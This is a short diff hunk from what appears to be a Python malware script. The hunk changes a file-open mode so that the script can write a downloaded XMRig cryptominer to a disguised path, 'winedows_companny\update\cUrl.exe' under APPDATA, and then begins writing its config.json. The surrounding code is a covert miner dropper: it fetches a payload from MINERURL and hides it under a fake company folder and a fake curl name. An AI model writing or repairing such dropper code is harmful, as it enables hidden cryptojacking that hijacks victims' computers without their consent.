@@ -723,7 +723,7 @@ if yes == "yes":
 				else:
 					XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe"
 					r = requests.get(MINERURL)
-					with open(os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe", 'rb') as f:
+					with open(os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe", 'rb+') as f:
 						f.write(r.content)
 					open(os.getenv('APPDATA') + "\\winedows_companny\\update\\config.json", "x").write('''
 	{
